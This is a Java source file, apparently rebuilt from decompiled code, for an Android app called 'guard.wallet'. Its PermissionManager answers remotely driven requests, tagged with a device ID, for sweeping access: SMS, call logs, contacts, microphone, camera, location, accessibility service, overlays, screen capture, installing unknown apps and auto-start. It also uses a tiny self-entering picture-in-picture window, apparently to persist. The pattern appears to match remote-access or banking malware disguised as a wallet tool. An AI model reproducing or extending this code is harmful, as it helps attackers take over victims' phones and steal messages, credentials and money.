package com.guard.wallet.permission;

import com.guard.wallet.core.AppUtils;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AppOpsManager;
import android.app.PictureInPictureParams;
import android.app.PictureInPictureParams.Builder;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Rect;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Process;
import android.provider.Settings;
import android.util.Log;
import android.util.Rational;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.PermissionRequestVO;
import com.guard.wallet.req.PermissionResponseVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.DeviceUtils;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;

import java.lang.ref.WeakReference;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * vendor原始: e/b.java (864 行) — 权限管理器 + PiP Activity 管理。
 *
 * 功能:
 *   - 持有当前 PiP Activity 弱引用 (singleton)
 *   - PiP 模式进入/退出
 *   - 运行时权限请求 (group + individual)
 *   - 特殊权限请求 (overlay, accessibility, battery, install, media projection, auto-start)
 *   - OEM 厂商自启动管理 Intent
 */
public final class PermissionManager {
    public static volatile PermissionManager instance;
    public static volatile WeakReference<Activity> activityRef;
    public static final AtomicBoolean isPipActive = new AtomicBoolean(false);
    public static final ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();

    // ═══════ Activity 管理 ═══════

    /** vendor e.b.a() — 获取当前持有的 Activity */
    public static Activity getActivity() {
        if (activityRef == null) {
            return null;
        }
        return activityRef.get();
    }

    /** vendor e.b.b(Activity) — 设置当前 Activity 弱引用 (synchronized) */
    public static synchronized void setActivity(Activity var0) {
        if (activityRef == null || activityRef.get() == null) {
            activityRef = new WeakReference<>(var0);
            SharedPrefsManager.I();
        } else if (!Objects.equals(var0, activityRef.get())) {
            activityRef = new WeakReference<>(var0);
            SharedPrefsManager.I();
        }
        if (instance == null) {
            instance = new PermissionManager();
        }
    }

    /** vendor e.b.c() — 检查 Activity 是否就绪且已进入 PiP */
    public static boolean isPipReady() {
        return activityRef != null && activityRef.get() != null && isPipActive.get();
    }

    /** vendor e.b.d() — 结束并移除 PiP Activity */
    public static void finishPip() {
        if (activityRef != null && activityRef.get() != null) {
            AtomicBoolean flag = isPipActive;
            if (flag.get()) {
                activityRef.get().finishAndRemoveTask();
                flag.set(false);
            }
        }
    }

    // ═══════ PiP 模式 ═══════

    /** vendor e.b.e() — 进入 PiP 画中画模式 */
    public static void enterPip() {
        try {
            int sdkInt = VERSION.SDK_INT;
            if (activityRef == null || activityRef.get() == null) {
                return;
            }

            Rational aspectRatio = new Rational(50, 20);
            Builder builder = new Builder();
            builder = builder.setAspectRatio(aspectRatio);
            Rect sourceRect = new Rect(0, 0, 50, 20);
            builder = builder.setSourceRectHint(sourceRect);

            // API 31+: setAutoEnterEnabled(true)
            if (sdkInt >= 31) {
                try {
                    builder.setAutoEnterEnabled(true);
                } catch (Exception ignored) {
                    // setAutoEnterEnabled not available on this ROM
                }
            }

            PictureInPictureParams params = builder.build();
            if (activityRef.get().enterPictureInPictureMode(params)) {
                isPipActive.set(true);
            }
        } catch (Exception ex) {
            AppUtils.s("AbsMainActivity", ex);
        }
    }

    // ═══════ 权限请求 ═══════

    /**
     * vendor e.b.f(PermissionRequestVO) — 主权限处理入口。
     *
     * 分两大路径:
     *   1. groupValue 非空 → 按 permission group 请求 (运行时权限)
     *   2. permissionValue 非空 → 按 individual permission 请求 (特殊权限 + 运行时权限)
     */
    public static PermissionResponseVO handlePermission(PermissionRequestVO var0) {
        PermissionResponseVO var12 = new PermissionResponseVO();
        var12.setDeviceId(SharedPrefsManager.l("deviceId"));
        Integer zero = 0;
        var12.setRequested(zero);
        var12.setGranted(zero);

        if (getActivity() == null || var0 == null || var0.getRequestCode() == null || var0.getRequestCode() <= 0) {
            return var12;
        }

        // ─── 路径1: groupValue 非空 → 按 group 请求 ───
        if (!AppUtils.B(var0.getGroupValue())) {
            return handleGroupPermission(var0);
        }

        // ─── 路径2: permissionValue 非空 → 按 individual 请求 ───
        if (!AppUtils.B(var0.getPermissionValue())) {
            var12.setRequestCode(var0.getRequestCode());
            return handleIndividualPermission(var0, var12, zero);
        }

        return var12;
    }

    // ─── Group Permission Handler ───

    private static PermissionResponseVO handleGroupPermission(PermissionRequestVO var0) {
        String groupValue = var0.getGroupValue();
        int requestCode = var0.getRequestCode();
        Integer zero = 0;

        PermissionResponseVO resp = new PermissionResponseVO();
        resp.setDeviceId(SharedPrefsManager.l("deviceId"));
        resp.setRequested(zero);
        resp.setGranted(zero);

        if (getActivity() == null || AppUtils.B(groupValue)) {
            return resp;
        }

        int groupId = mapGroupValue(groupValue);

        switch (groupId) {
            case 0: { // CONTACTS
                int w = ContextCompat.checkSelfPermission(getActivity(), "android.permission.WRITE_CONTACTS");
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_CONTACTS") == 0 && w == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(),
                        new String[]{"android.permission.WRITE_CONTACTS", "android.permission.READ_CONTACTS"}, requestCode);
                break;
            }
            case 1: { // PHONE
                int call = ContextCompat.checkSelfPermission(getActivity(), "android.permission.CALL_PHONE");
                int state = ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_PHONE_STATE");
                if (call == 0 && state == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(),
                        new String[]{"android.permission.CALL_PHONE", "android.permission.READ_PHONE_STATE"}, requestCode);
                break;
            }
            case 2: { // CALENDAR
                int w = ContextCompat.checkSelfPermission(getActivity(), "android.permission.WRITE_CALENDAR");
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_CALENDAR") == 0 && w == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(),
                        new String[]{"android.permission.WRITE_CALENDAR", "android.permission.READ_CALENDAR"}, requestCode);
                break;
            }
            case 3: { // CALL_LOG
                int read = ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_CALL_LOG");
                int write = ContextCompat.checkSelfPermission(getActivity(), "android.permission.WRITE_CALL_LOG");
                if (read == 0 && write == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(),
                        new String[]{"android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG"}, requestCode);
                break;
            }
            case 4: { // CAMERA
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.CAMERA") == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(), new String[]{"android.permission.CAMERA"}, requestCode);
                break;
            }
            case 5: { // READ_MEDIA_VISUAL
                if (VERSION.SDK_INT < 33) {
                    return resp;
                }
                int images = ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_MEDIA_IMAGES");
                int video = ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_MEDIA_VIDEO");
                if (images == 0 && video == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(),
                        new String[]{"android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"}, requestCode);
                break;
            }
            case 6: { // READ_MEDIA_AURAL
                if (VERSION.SDK_INT < 33) {
                    return resp;
                }
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_MEDIA_AUDIO") == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(), new String[]{"android.permission.READ_MEDIA_AUDIO"}, requestCode);
                break;
            }
            case 7: { // ACTIVITY_RECOGNITION
                if (VERSION.SDK_INT < 29) {
                    return resp;
                }
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.ACTIVITY_RECOGNITION") == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(), new String[]{"android.permission.ACTIVITY_RECOGNITION"}, requestCode);
                break;
            }
            case 8: { // SENSORS
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.BODY_SENSORS") == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(), new String[]{"android.permission.BODY_SENSORS"}, requestCode);
                break;
            }
            case 9: { // LOCATION
                int fine = ContextCompat.checkSelfPermission(getActivity(), "android.permission.ACCESS_FINE_LOCATION");
                int coarse = ContextCompat.checkSelfPermission(getActivity(), "android.permission.ACCESS_COARSE_LOCATION");
                if (fine == 0 && coarse == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(),
                        new String[]{"android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION"}, requestCode);
                break;
            }
            case 10: { // STORAGE
                int w = ContextCompat.checkSelfPermission(getActivity(), "android.permission.WRITE_EXTERNAL_STORAGE");
                int r = ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_EXTERNAL_STORAGE");
                if (w == 0 && r == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(),
                        new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"}, requestCode);
                break;
            }
            case 11: { // NOTIFICATIONS
                if (VERSION.SDK_INT < 33) {
                    return resp;
                }
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.POST_NOTIFICATIONS") == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(), new String[]{"android.permission.POST_NOTIFICATIONS"}, requestCode);
                break;
            }
            case 12: { // MICROPHONE
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.RECORD_AUDIO") == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(), new String[]{"android.permission.RECORD_AUDIO"}, requestCode);
                break;
            }
            case 13: { // NEARBY_DEVICES
                if (VERSION.SDK_INT < 33) {
                    return resp;
                }
                if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.NEARBY_WIFI_DEVICES") == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(), new String[]{"android.permission.NEARBY_WIFI_DEVICES"}, requestCode);
                break;
            }
            case 14: { // SMS
                int recv = ContextCompat.checkSelfPermission(getActivity(), "android.permission.RECEIVE_SMS");
                int read = ContextCompat.checkSelfPermission(getActivity(), "android.permission.READ_SMS");
                if (recv == 0 && read == 0) {
                    resp.setRequested(zero);
                    resp.setGranted(1);
                    return resp;
                }
                ActivityCompat.requestPermissions(getActivity(),
                        new String[]{"android.permission.RECEIVE_SMS", "android.permission.READ_SMS"}, requestCode);
                break;
            }
            default:
                return resp;
        }

        resp.setRequested(1);
        resp.setGranted(zero);
        return resp;
    }

    /** 将 group value 字符串映射为 switch case 编号 */
    private static int mapGroupValue(String groupValue) {
        if (groupValue == null) return -1;
        switch (groupValue) {
            case "android.permission-group.CONTACTS":           return 0;
            case "android.permission-group.PHONE":              return 1;
            case "android.permission-group.CALENDAR":           return 2;
            case "android.permission-group.CALL_LOG":           return 3;
            case "android.permission-group.CAMERA":             return 4;
            case "android.permission-group.READ_MEDIA_VISUAL":  return 5;
            case "android.permission-group.READ_MEDIA_AURAL":   return 6;
            case "android.permission-group.ACTIVITY_RECOGNITION": return 7;
            case "android.permission-group.SENSORS":            return 8;
            case "android.permission-group.LOCATION":           return 9;
            case "android.permission-group.STORAGE":            return 10;
            case "android.permission-group.NOTIFICATIONS":      return 11;
            case "android.permission-group.MICROPHONE":         return 12;
            case "android.permission-group.NEARBY_DEVICES":     return 13;
            case "android.permission-group.SMS":                return 14;
            default:                                            return -1;
        }
    }

    // ─── Individual Permission Handler ───

    private static PermissionResponseVO handleIndividualPermission(
            PermissionRequestVO var0, PermissionResponseVO var12, Integer zero) {

        String permValue = var0.getPermissionValue();
        int permId = mapPermissionValue(permValue);

        switch (permId) {
            case 0: { // AUTO_START
                boolean launched = handleAutoStart(var0);
                if (launched) {
                    var12.setRequested(1);
                    var12.setGranted(zero);
                    return var12;
                }
                // 已授权或无法打开
                var12.setRequested(zero);
                var12.setGranted(1);
                return var12;
            }
            case 1: { // USAGE_ACCESS_SETTINGS
                Activity activity = getActivity();
                boolean hasUsageAccess = false;
                AppOpsManager appOps = (AppOpsManager) activity.getSystemService("appops");
                if (appOps.checkOpNoThrow("android:get_usage_stats", Process.myUid(), activity.getPackageName()) == 0) {
                    hasUsageAccess = true;
                }
                if (!hasUsageAccess) {
                    Intent intent = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
                    startForResult(intent, var0.getRequestCode());
                    var12.setRequested(1);
                    var12.setGranted(zero);
                    return var12;
                }
                var12.setRequested(zero);
                var12.setGranted(1);
                return var12;
            }
            case 2: { // ACCESSIBILITY
                Activity activity = getActivity();
                String serviceName = MyAccessibilityService.class.getName();
                List<RunningServiceInfo> services =
                        ((ActivityManager) activity.getSystemService("activity")).getRunningServices(100);
                boolean isRunning = false;
                if (!services.isEmpty()) {
                    for (int i = 0; i < services.size(); i++) {
                        if (services.get(i).service.getClassName().equals(serviceName)) {
                            isRunning = true;
                            break;
                        }
                    }
                }
                if (!isRunning) {
                    SystemHelper.V0();
                    var12.setRequested(1);
                    var12.setGranted(zero);
                    return var12;
                }
                var12.setRequested(zero);
                var12.setGranted(1);
                return var12;
            }
            case 3: { // OVERLAY
                if (Settings.canDrawOverlays(getActivity())) {
                    var12.setRequested(zero);
                    var12.setGranted(1);
                    return var12;
                }
                Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                intent.setData(Uri.parse("package:" + MainApplication.getAppContext().getPackageName()));
                startForResult(intent, var0.getRequestCode());
                var12.setRequested(1);
                var12.setGranted(zero);
                return var12;
            }
            case 4: { // MANAGE_UNKNOWN_APP_SOURCES
                if (getActivity().getPackageManager().canRequestPackageInstalls()) {
                    var12.setRequested(zero);
                    var12.setGranted(1);
                    return var12;
                }
                Intent intent = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES",
                        Uri.parse("package:" + getActivity().getPackageName()));
                startForResult(intent, var0.getRequestCode());
                var12.setRequested(1);
                var12.setGranted(zero);
                return var12;
            }
            case 5: { // IGNORE_BATTERY_OPTIMIZATIONS
                if (SystemHelper.o0()) {
                    var12.setRequested(zero);
                    var12.setGranted(1);
                    return var12;
                }
                Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                String pkg = (getActivity() != null) ? getActivity().getPackageName() : null;
                intent.setData(Uri.parse("package:" + pkg));
                startForResult(intent, var0.getRequestCode());
                var12.setRequested(1);
                var12.setGranted(zero);
                return var12;
            }
            case 6: { // MEDIA_PROJECTION
                MediaProjectionManager mpm =
                        (MediaProjectionManager) getActivity().getSystemService("media_projection");
                if (mpm == null) {
                    return var12;
                }
                Intent captureIntent = mpm.createScreenCaptureIntent();
                startForResult(captureIntent, var0.getRequestCode());
                var12.setRequested(1);
                var12.setGranted(zero);
                return var12;
            }
            default: {
                // 普通运行时权限
                if (ContextCompat.checkSelfPermission(getActivity(), var0.getPermissionValue()) != 0) {
                    ActivityCompat.requestPermissions(getActivity(),
                            new String[]{var0.getPermissionValue()}, var0.getRequestCode());
                    var12.setRequested(1);
                    var12.setGranted(zero);
                    return var12;
                }
                var12.setRequested(zero);
                var12.setGranted(1);
                return var12;
            }
        }
    }

    /** 将 permission value 字符串映射为 switch case 编号 */
    private static int mapPermissionValue(String permValue) {
        if (permValue == null) return -1;
        switch (permValue) {
            case "android.permission.AUTO_START":                   return 0;
            case "android.permission.USAGE_ACCESS_SETTINGS":        return 1;
            case "android.permission.ACCESSIBILITY":                return 2;
            case "android.permission.OVERLAY":                      return 3;
            case "android.permission.MANAGE_UNKNOWN_APP_SOURCES":   return 4;
            case "android.permission.IGNORE_BATTERY_OPTIMIZATIONS": return 5;
            case "android.permission.MEDIA_PROJECTION":             return 6;
            default:                                                return -1;
        }
    }

    // ─── Auto-Start OEM Handler ───

    /**
     * vendor AUTO_START 处理 — 按厂商打开对应自启动管理页面。
     * 返回 true 表示已启动 Activity (requested), false 表示已授权或无对应页面。
     */
    private static boolean handleAutoStart(PermissionRequestVO var0) {
        if (getActivity() == null) {
            return false;
        }

        // 检查是否已有 RECEIVE_BOOT_COMPLETED 权限 + 未处于引导状态
        if (ContextCompat.checkSelfPermission(getActivity(), "android.permission.RECEIVE_BOOT_COMPLETED") == 0
                && !DeviceUtils.isHuaweiOrHonor()) {
            SharedPrefsManager.i("has_receive_completed");
            SharedPrefsManager.j("last_req_start_timestamp");
            System.currentTimeMillis();
        }

        Activity activity = getActivity();
        String manufacturer = Build.MANUFACTURER;
        Intent intent = new Intent();
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        String mfLower = manufacturer.toLowerCase();
        ComponentName component = null;

        switch (mfLower) {
            case "oneplus":
                component = new ComponentName("com.oneplus.security",
                        "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity");
                break;
            case "huawei":
            case "honor":
                Log.d("自启动管理 >>>>", "getAutostartSettingIntent: 华为");
                component = new ComponentName("com.huawei.systemmanager",
                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity");
                break;
            case "xiaomi":
                component = new ComponentName("com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity");
                break;
            case "yulong":
            case "360":
                component = new ComponentName("com.yulong.android.coolsafe",
                        "com.yulong.android.coolsafe.ui.activity.autorun.AutoRunListActivity");
                break;
            case "itel":
            case "tecno":
            case "infinix":
                component = new ComponentName("com.transsion.phonemaster",
                        "com.cyin.himgr.autostart.AutoStartActivity");
                break;
            case "letv":
                intent.setAction("com.letv.android.permissionautoboot");
                break;
            case "oppo":
                component = new ComponentName("com.coloros.safecenter",
                        "com.coloros.safecenter.startupapp.StartupAppListActivity");
                break;
            case "vivo":
                component = new ComponentName("com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.PurviewTabActivity");
                break;
            case "meizu":
                component = new ComponentName("com.meizu.safe",
                        "com.meizu.safe.permission.SmartBGActivity");
                break;
            case "samsung":
                component = new ComponentName("com.samsung.android.sm",
                        "com.samsung.android.sm.app.dashboard.SmartManagerDashBoardActivity");
                break;
            default:
                // 默认: 打开系统设置
                intent = new Intent("android.settings.SETTINGS");
                break;
        }

        if (component != null) {
            intent.setComponent(component);
        }

        // 验证 Intent 可解析
        List resolveList = activity.getPackageManager().queryIntentActivities(intent, 65536);
        Intent resolvedIntent = null;
        if (resolveList != null && resolveList.size() > 0) {
            resolvedIntent = intent;
        }

        if (resolvedIntent != null) {
            if (getActivity() != null) {
                getActivity().startActivity(resolvedIntent);
            }
            SharedPrefsManager.D(System.currentTimeMillis(), "last_req_start_timestamp");
            return true;
        }

        return false;
    }

    // ═══════ startActivityForResult ═══════

    /** vendor e.b.g(Intent, requestCode) — 安全地 startActivityForResult */
    public static void startForResult(Intent var0, int var1) {
        if (getActivity() != null) {
            try {
                getActivity().startActivityForResult(var0, var1);
            } catch (Exception var2) {
                AppUtils.s("AbsMainActivity", var2);
            }
        }
    }
}
